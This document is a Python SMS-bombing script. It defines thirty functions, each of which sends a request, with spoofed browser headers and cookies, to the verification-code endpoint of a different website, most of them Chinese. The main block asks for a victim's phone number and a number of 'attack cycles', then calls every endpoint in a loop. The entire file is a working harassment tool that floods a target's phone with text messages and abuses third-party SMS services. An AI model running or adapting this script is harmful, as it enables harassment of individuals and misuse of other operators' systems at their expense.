import requests
import json
import time

def keyang(mobile):
    headers = {
        "Host": "121.41.86.73",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://121.41.86.73/back/login",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "JSESSIONID=EE69EF79BFAEA4D0BC981D57005C6CA5"
    }
    url = "http://121.41.86.73/common/validCode?phone="+mobile
    response = requests.get(url, headers=headers, timeout=3)
    text = response.content.decode()
    print("1、已提交请求！")
def woniu(mobile):
    headers = {
        "Host": "www.woniuxy.com",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://www.woniuxy.com/",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://www.woniuxy.com/regist/sendCode?tel="+mobile+"&type=forge"
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("2、已提交请求！")
def zhongxinhui(mobile):
    headers = {
        "Host": "39.104.124.95",
        "Content-Length": "37",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://39.104.124.95",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "http://39.104.124.95/",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "ASP.NET_SessionId=r32hxbwygq04c1wzac4iwaqf; nfine_mac=2367FC7ECA365BBE445A208A47688104; nfine_licence=3DBFA84844D0A476D9417D980C66ADA4; nfine_currentmoduleid=5f7738b1-6986-457b-ae32-c678d4a9830f; __RequestVerificationToken=RnHvj7fovfLZ-Onfhi-mgTCnHYHkCvSPl1JVshFx69chipdrPzeiCQpJoYSYeAAOI97E9vVNwZVgAp347dMJcNMesEozS6eKYHMXdL_heT01",
        "Connection": "close"
    }
    url = "http://39.104.124.95/Register/GetCheckCode"
    response = requests.post(url, headers=headers, data="phone="+mobile+"&r=0.493090335329756", timeout=3)
    text = response.content.decode()
    print("3、已提交请求！")
def xiaohu(mobile):
    headers = {
        "Host": "106.14.39.235",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://106.14.39.235",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://106.14.39.235/",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=55E96D67B5D6633479EE80898C009C42; JSESSIONID=F657D884DA3FCA38E90FCCF6E8377F47",
        "Connection": "close"
    }
    url = "http://106.14.39.235/xiaohoo-api/rest/v1/userinformation/sendSmsCodeCheckPhoneExist"
    response = requests.post(url, headers=headers, data="para=%7B%22phone%22%3A%22"+mobile+"%22%7D")
    text = response.content.decode()
    print("4、已提交请求！")
def haifeng(mobile):
    headers = {
        "Host": "uapi.hfjy.com",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://118.31.159.64",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://118.31.159.64",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=55E96D67B5D6633479EE80898C009C42; JSESSIONID=F657D884DA3FCA38E90FCCF6E8377F47",
        "Connection": "close"
    }
    url = "http://118.31.159.64/index.php/haifeng/sendMsgCode.html"
    response = requests.post(url, headers=headers, data="phone="+mobile)
    text = response.content.decode()
    print("5、已提交请求！")
def yibaoyun(mobile):
    headers = {
        "Host": "47.106.65.118",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://47.106.65.118",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://47.106.65.118",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=55E96D67B5D6633479EE80898C009C42; JSESSIONID=F657D884DA3FCA38E90FCCF6E8377F47",
        "Connection": "close"
    }
    url = "http://47.106.65.118/topvisionAPI/SMS/GetSMSCode"
    response = requests.post(url, headers=headers, data="strMobile="+mobile)
    text = response.content.decode()
    print("6、已提交请求！")

def qingqinbang(mobile):
    headers = {
        "Host": "118.178.119.230",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://118.178.119.230",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://118.178.119.230",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=55E96D67B5D6633479EE80898C009C42; JSESSIONID=F657D884DA3FCA38E90FCCF6E8377F47",
        "Connection": "close"
    }
    url = "http://118.178.119.230/a/wxinterface/sms/send"
    response = requests.post(url, headers=headers, data="mobile="+mobile)
    text = response.content.decode()
    print("7、已提交请求！")

def chenxin(mobile):
    headers = {
        "Host": "47.104.173.183",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://47.104.173.183",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://47.104.173.183/web/index",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=55E96D67B5D6633479EE80898C009C42; JSESSIONID=F657D884DA3FCA38E90FCCF6E8377F47",
        "Connection": "close"
    }
    url = "http://47.104.173.183/web/user/register/send/identity/code "
    response = requests.post(url, headers=headers, data="userTel="+mobile)
    text = response.content.decode()
    print("8、已提交请求！")

def jietu(mobile):
    headers = {
        "Host": "user.jietusoft.com",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://user.jietusoft.com",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://user.jietusoft.com/signup.html",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=55E96D67B5D6633479EE80898C009C42; JSESSIONID=F657D884DA3FCA38E90FCCF6E8377F47",
        "Connection": "close"
    }
    url = "http://user.jietusoft.com/ajax/sendsms.html"
    response = requests.post(url, headers=headers, data="mobile="+mobile)
    text = response.content.decode()
    print("9、已提交请求！")

def zulin(mobile):
    headers = {
        "Host": "183.230.147.137:500",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://183.230.147.137:500",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://183.230.147.137:500/login.html",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://183.230.147.137:500/tools/submit_ajax.ashx?action=user_verify_smscode&site=main"
    response = requests.post(url, headers=headers, data="mobile="+mobile)
    text = response.content.decode()
    print("10、已提交请求！")

def ruijie(mobile):
    headers = {
        "Host": "114.215.209.100",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://114.215.209.100/",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://114.215.209.100/manager/addUserGetSmsCode.action?telephone="+mobile
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("11、已提交请求！")

def daojiale(mobile):
    headers = {
        "Host": "cq.daojiale.com",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://cq.daojiale.com",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://cq.daojiale.com",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://cq.daojiale.com/user/sendyzm"
    response = requests.post(url, headers=headers, data="pe="+mobile)
    text = response.content.decode()
    print("12、已提交请求！")

def dai93(mobile):
    headers = {
        "Host": "bt.swdai93.com",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://bt.swdai93.com/login/login.do?pageType=reg",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://bt.swdai93.com/login/send_sms.do?phone="+mobile+"&type=1"
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("13、已提交请求！")

def wuliuyun(mobile):
    headers = {
        "Host": "portal.my56cloud.com",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://portal.my56cloud.com/author/register/user",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://portal.my56cloud.com/sms/deliver?mobileNo="+mobile
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("14、已提交请求！")

def HR(mobile):
    headers = {
        "Host": "www.hr730.com",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://www.hr730.com",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://www.hr730.com/account/index/register",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://www.hr730.com/share/sms/send"
    response = requests.post(url, headers=headers, data="mobile="+mobile+"&type_id=1")
    text = response.content.decode()
    print("15、已提交请求！")

def pengyuan(mobile):
    headers = {
        "Host": "shop.pnpyyy.com",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://shop.pnpyyy.com",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://shop.pnpyyy.com/register.jhtml",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://shop.pnpyyy.com/common/code.jhtml"
    response = requests.post(url, headers=headers, data="mobile="+mobile)
    text = response.content.decode()
    print("16、已提交请求！")

def lechou(mobile):
    headers = {
        "Host": "106.15.130.50",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://106.15.130.50",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://106.15.130.50/public/loginByVerificationCode",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://106.15.130.50/public/sendSmsCode"
    response = requests.post(url, headers=headers, data="phone="+mobile+"&code=")
    text = response.content.decode()
    print( "17、已提交请求！")

def kangka(mobile):
    headers = {
        "Host": "47.104.105.233",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://47.104.105.233/index.php/login/index.html",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://47.104.105.233/index.php/Send/index?mobile="+mobile
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("18、已提交请求！")

def chee(mobile):
    headers = {
        "Host": "www.cheegu.com",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://www.cheegu.com/index.php/login/index.html",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://www.cheegu.com/user/??=getVerifyCode&mobile="+mobile+"&checkExistsMobile=true"
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("19、已提交请求！")

def zhangjiang(mobile):
    headers = {
        "Host": "117.78.35.4:8081",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://117.78.35.4:8081",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://117.78.35.4:8081/api/users/verification?systemId=ht_02&account="+mobile+"&accountType=1"
    response = requests.get(url, headers=headers)
    text = response.content.decode()
    print("20、已提交请求！")

def zhilian(mobile):
    headers = {
        "Host": "112.74.183.211",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://112.74.183.211",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://112.74.183.211/Register",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://112.74.183.211/phoneRandcode?ajaxtag=1"
    response = requests.post(url, headers=headers, data="phone="+mobile+"&type=register")
    text = response.content.decode()
    print("21、已提交请求！")

def caishang(mobile):
    headers = {
        "Host": "59.110.166.188",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://59.110.166.188",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://59.110.166.188/",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "JSESSIONID=2FB973285051A5E527C1D7F7F0B607BC; UM_distinctid=1630258362a50c-0f9f40df9a8f98-b34356b-100200-1630258362b764; CNZZDATA1267335170=1923575576-1524752728-%7C1524752728; Hm_lvt_97ed94813da537cb1596a48876599729=1524752727; Hm_lpvt_97ed94813da537cb1596a48876599729=1524752734",
        "Connection": "close"
    }
    url = "http://59.110.166.188/index.php/Index/get_code"
    response = requests.post(url, headers=headers, data="types=1&mobile="+mobile)
    print("22、已提交请求！")

def wangle(mobile):
    headers = {
        "Host": "47.52.92.222",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Referer": "http://47.52.92.222",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "_jfinal_captcha=cbee08291e2b48919dc01d9d9e18147f; UM_distinctid=16301bea53dabf-0a82df8e89a584-b34356b-100200-16301bea53f104; CNZZDATA1273072395=2021172653-1524740981-null%7C1524740981"
    }
    url = "http://47.52.92.222/user/sms.jhtml?phone="+mobile+"&type=register"
    response = requests.get(url, headers=headers)
    print(response.content.decode())
    print("23、已提交请求！")

def shiper(mobile):
    headers = {
        "Host": "47.90.106.208",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://47.90.106.208",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://47.90.106.208/",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "yunsuo_session_verify=03d30d1dae3f108299bb08d03ae342b0; ASP.NET_SessionId=hnk4x1gkvyjwk4ph2ioxjrne",
        "Connection": "close"
    }
    url = "http://47.90.106.208/customer/DuanxinRegistAndLogin_obtainDXCode.action"
    response = requests.post(url, headers=headers, data="mobile="+mobile+"&type=zhuce")
    print(response.content.decode())
    print("24、已提交请求！")
def guotu(mobile):
    headers = {
        "Host": "114.55.60.60",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://114.55.60.60",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://114.55.60.60/",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "yunsuo_session_verify=03d30d1dae3f108299bb08d03ae342b0; ASP.NET_SessionId=hnk4x1gkvyjwk4ph2ioxjrne",
        "Connection": "close"
    }
    url = "http://114.55.60.60/tools/submit_ajax.ashx?action=user_verify_smscode&site=main&reg=true"
    response = requests.post(url, headers=headers, data="mobile="+mobile)
    print(response.content.decode())
    print("25、已提交请求！")

def dongneng(mobile):
    headers = {
        "Host": "39.108.105.97",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://39.108.105.97",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://39.108.105.97/weixin/regist?openId=",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "yunsuo_session_verify=03d30d1dae3f108299bb08d03ae342b0; ASP.NET_SessionId=hnk4x1gkvyjwk4ph2ioxjrne",
        "Connection": "close"
    }
    url = "http://39.108.105.97/weixin/sendValidCode"
    response = requests.post(url, headers=headers, data="phone="+mobile)
    print(response.content.decode())
    print("26、已提交请求！")

def jingtang(mobile):
    headers = {
        "Host": "116.62.211.126",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://116.62.211.126",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://116.62.211.126/index.php?c=entry&m=shop_4tb&do=mobile&r=account.register&backurl=Yz1lbnRyeSZtPXNob3BfNHRiJmRvPW1vYmlsZSZyPW1lbWJlcg%253D%253D",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "yunsuo_session_verify=03d30d1dae3f108299bb08d03ae342b0; ASP.NET_SessionId=hnk4x1gkvyjwk4ph2ioxjrne",
        "Connection": "close"
    }
    url = "http://116.62.211.126/index.php?c=entry&m=shop_4tb&do=mobile&r=account.verifycode"
    response = requests.post(url, headers=headers, data="mobile="+mobile+"&imgcode=0&temp=sms_reg")
    print(response.content.decode())
    print("27、已提交请求！")

def bujide(mobile):
    headers = {
        "Host": "27.155.103.34",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://27.155.103.34",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://27.155.103.34/design-settled.php",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "yunsuo_session_verify=03d30d1dae3f108299bb08d03ae342b0; ASP.NET_SessionId=hnk4x1gkvyjwk4ph2ioxjrne",
        "Connection": "close"
    }
    url = "http://27.155.103.34/get_code.php"
    response = requests.post(url, headers=headers, data="tels="+mobile)
    print(response.content.decode())
    print("28、已提交请求！")

def juejin(mobile):
    headers = {
        "Host": "47.75.8.225",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://47.75.8.225",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://47.75.8.225/?login",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "yunsuo_session_verify=03d30d1dae3f108299bb08d03ae342b0; ASP.NET_SessionId=hnk4x1gkvyjwk4ph2ioxjrne",
        "Connection": "close"
    }
    url = "http://47.75.8.225/?control&cmd=getcode"
    response = requests.post(url, headers=headers, data="phone="+mobile)
    print(response.content.decode())
    print("29、已提交请求！")

def qiduo(mobile):
    headers = {
        "Host": "120.79.167.199",
        "Content-Length": "30",
        "Accept": "application / json, text / javascript, * / *; q = 0.01",
        "Origin": "http://120.79.167.199",
        "X-Requested-With": "XMLHttpReques",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
        "Referer": "http://120.79.167.199/Login/login.html",
        "Accept-Language": "zh-CN,zh;q = 0.9",
        "Cookie": "think_language=zh-CN; PHPSESSID=rcc4r2u6vrne2f07h9ccgidf21",
        "Connection": "close"
    }
    url = "http://120.79.167.199/Login/sendcode.html"
    response = requests.post(url, headers=headers, data="mobile="+mobile)
    print(response.content.decode())
    print("30、已提交请求！")

if __name__ == '__main__':
    mobile = input("请输入手机号：")
    number = int(input("请输入循环攻击次数："))
    i = 0
    timeNumber = int(input("请输入请求间隔时间："))
    while i<number:
        keyang(mobile)
        time.sleep(timeNumber)
        woniu(mobile)
        time.sleep(timeNumber)
        try:
            zhongxinhui(mobile)
            time.sleep(timeNumber)
        except:
            print("请求异常！")
        xiaohu(mobile)
        time.sleep(timeNumber)
        haifeng(mobile)
        time.sleep(timeNumber)
        yibaoyun(mobile)
        time.sleep(timeNumber)
        qingqinbang(mobile)
        time.sleep(timeNumber)
        chenxin(mobile)
        time.sleep(timeNumber)
        jietu(mobile)
        time.sleep(timeNumber)
        zulin(mobile)
        time.sleep(timeNumber)
        daojiale(mobile)
        time.sleep(timeNumber)
        dai93(mobile)
        time.sleep(timeNumber)
        wuliuyun(mobile)
        time.sleep(timeNumber)
        HR(mobile)
        time.sleep(timeNumber)
        pengyuan(mobile)
        time.sleep(timeNumber)
        lechou(mobile)
        time.sleep(timeNumber)
        ruijie(mobile)
        time.sleep(timeNumber)
        kangka(mobile)
        time.sleep(timeNumber)
        chee(mobile)
        time.sleep(timeNumber)
        zhangjiang(mobile)
        time.sleep(timeNumber)
        zhilian(mobile)
        time.sleep(timeNumber)
        caishang(mobile)
        time.sleep(timeNumber)
        wangle(mobile)
        time.sleep(timeNumber)
        shiper(mobile)
        time.sleep(timeNumber)
        guotu(mobile)
        time.sleep(timeNumber)
        dongneng(mobile)
        time.sleep(timeNumber)
        jingtang(mobile)
        time.sleep(timeNumber)
        bujide(mobile)
        time.sleep(timeNumber)
        juejin(mobile)
        time.sleep(timeNumber)
        qiduo(mobile)
        time.sleep(timeNumber)
        i+=1



